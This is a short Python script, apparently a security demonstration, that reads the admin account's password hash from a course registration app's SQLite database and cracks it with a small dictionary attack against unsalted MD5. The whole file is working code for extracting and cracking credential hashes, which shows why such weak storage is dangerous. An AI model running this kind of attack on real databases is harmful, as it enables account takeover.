import sqlite3
import hashlib
import os

# 1. Path to your database (adjust if necessary)
DB_PATH = "../../backend/course_registration.db"
def crack_password():
    print(f"[*] Connecting to database at: {DB_PATH}")
    
    if not os.path.exists(DB_PATH):
        print("[-] Error: Database file not found!")
        return

    # 2. Extract the hash
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT email, password_hash FROM users WHERE email='admin@university.edu'")
    user = cursor.fetchone()
    conn.close()

    if not user:
        print("[-] Admin user not found.")
        return

    email, target_hash = user
    print(f"[+] Found Admin Hash: {target_hash}")

    # 3. The "Attack" (Dictionary of common passwords)
    # In a real attack, this list would be millions of lines long.
    dictionary = ["123456", "password", "admin", "welcome", "admin123", "secret"]

    print("[*] Starting Dictionary Attack...")

    for password in dictionary:
        # Calculate MD5 of the guess
        guess_hash = hashlib.md5(password.encode()).hexdigest()
        
        if guess_hash == target_hash:
            print(f"\n[!] CRACKED SUCCESSFUL!")
            print(f"[!] Email: {email}")
            print(f"[!] Password: {password}")
            return

    print("[-] Password not found in dictionary.")

if __name__ == "__main__":
    crack_password()